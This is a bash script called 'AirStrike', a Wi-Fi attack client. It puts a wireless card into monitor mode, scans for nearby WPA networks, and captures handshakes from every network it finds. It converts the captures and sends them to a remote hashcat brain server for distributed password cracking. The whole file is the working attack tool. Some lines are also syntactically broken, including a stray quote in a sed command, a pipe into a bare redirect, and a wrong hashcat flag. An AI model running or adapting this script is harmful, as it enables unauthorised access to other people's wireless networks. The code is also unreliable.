#!/bin/bash
password="PASSWORD"
port="PORT"
ip="IP"
outfile="OUTFILE"
potfile="POTFILE"
workload="WORKLOAD"
default_iface=$(ip addr show|grep default|grep -i up|grep -vi loopback|tail -1|awk '{print $2}'|sed 's/:/'/)
wordlist="custom_wordlist.txt"
essid_list="found_aps.txt"

red=`tput setaf 1`
green=`tput setaf 2`
yellow=`tput setaf 3`
blue=`tput setaf 4`
magenta=`tput setaf 5`
grey=`tput setaf 8`
reset=`tput sgr0`
bold=`tput bold`
underline=`tput smul`

l="${red}< * >${reset}"


print_good(){
    echo "${green}[+]${reset}" $1
}
print_error(){
    echo "${red}[x]${reset}" $1
}
print_info(){
    echo "[*]" $1
}

print_banner(){
echo """		        
$red
 | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ |
 | . A . i . r   S . t . r . i . k . e . |
 | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ |
$reset
"""
}

print_usage(){
print_banner
echo "Created by: redcodelabs.io $l"
echo
echo "usage: airstrike_client.sh [-h] [-i <interface>] [-w <wordlist>]"
echo
echo "options:"
echo " -h	      Show help message and exit"
echo " -i         Interface to use              (default: ${green}auto${reset})"
echo " -w         Wordlist to use               (default:   ${red}none${reset})"
echo
echo "Press $grey[Ctrl + i]$reset to print summary about handshakes captured so far"
echo "Press $grey[Ctrl + s]$reset to send captured data to the server"
echo
echo
}

while getopts "hi:w:" opt; do
    case "$opt" in
    h)
        print_usage
        exit 0
        ;;
    i)  default_iface=$OPTARG
        ;;
    w)  wordlist=$OPTARG
        ;;
    esac
done
shift $((OPTIND-1))
[ "${1:-}" = "--" ] && shift

bind -x '"\C-i":"convert_and_print_summary"'
convert_and_print_summary(){ #BIND
    total_num_handshakes=0
    for f in *.cap; do
        hc_filename=$(echo $f|sed "s/cap/hccapx/")
        num_handshakes=$(cap2hccapx $f $hc_filename|tail -n1|awk '{print $2}')
        if [ $num_handshakes -eq 0 ]; then
            print_error "No handshakes found in $red[$f]$reset"  
        else
            print_good "Found $bold$num_handshakes$reset handshakes in $green[$f]$reset"
            $((total_num_handshakes++))
        fi
    done
}

find_essids(){
    iface="${default_iface}mon"
    timeout --foreground 10 airodump-ng $iface --output-format csv -t wpa -w capture > /dev/null 2>&1 & 
    sed '1,/Station/!d' capture-01.csv|grep -v seen|grep "\S"|awk -F',' 'BEGIN{OFS=" @"}{print $14 $4}'| > $essid_list
}

aircrack_capture(){
    iface="${default_iface}mon"
    #read from $essid_list
    for line in $(cat $essid_list); do
        essid=$(echo $line|awk -F'@' '{print $1}')
        chan=$(echo $line|awk -F'@' '{print $2}')
        sudo airodump-ng --ignore-negative-one --essid $essid --channel $chan --output-format pcap --write $essid > /dev/null 2>&1 &
    done
}

start_hashcat_client(){
    hccapx=$1
    hashcat --brain-client --brain-port $port --brain-host $ip --brain-password $password -w $workload --potfile-path $potfile -o $outfile -a 2500 $hccapx $wordlist 
}

set_monitor(){
    sudo airmon-ng check kill
    sudo airmon-ng start $default_iface
}

bind -x '"\C-s":"send_to_server"'
send_to_server(){ #BIND
    for f in *.hccapx; do
        start_hashcat_client $f > /dev/null 2>&1 
    done
}


watch_pcap(){
    ls *.cap|entr -p echo Captured handshake - $green /_ $reset &
}

set_monitor
find_essids
aircrack_capture &